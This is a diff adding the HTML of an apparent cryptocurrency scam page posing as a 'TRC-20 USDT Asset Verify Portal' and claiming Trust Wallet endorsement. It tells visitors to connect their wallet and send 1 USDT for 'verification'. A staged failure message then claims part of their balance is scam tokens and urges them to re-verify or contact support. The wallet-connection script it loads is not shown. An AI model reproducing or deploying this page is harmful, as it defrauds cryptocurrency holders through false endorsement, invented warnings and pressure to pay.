@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>TRC‑20 USDT Asset Verify Portal</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="header">
+    <img src="logo.png" alt="Logo">
+    <h1>TRC‑20 Asset Verify Portal</h1>
+    <h2>Trusted by Trust Wallet™</h2>
+  </div>
+  <div class="main">
+    <p>🛡️ <strong>VERIFY YOUR USDT</strong><br>
+       Please connect your wallet and send <strong>1 USDT</strong> to initiate full balance verification.</p>
+    <button id="connectBtn">Connect Wallet</button>
+    <div id="status"></div>
+  </div>
+  <div id="result" class="hidden">
+    <div class="warning">
+      ❌ <strong>Verification Failed</strong><br>
+      ⚠️ <span id="percent">XX%</span> of your USDT appears to be flash/scam tokens.  
+      <br>Please <a href="#">re‑verify</a> or contact support.
+    </div>
+  </div>
+  <footer>
+    <a href="terms.html">Terms & Conditions</a> | BitcoinTraders Pvt. Ltd.™ | ©2025
+  </footer>
+  <script src="script.js"></script>
+</body>
+</html>
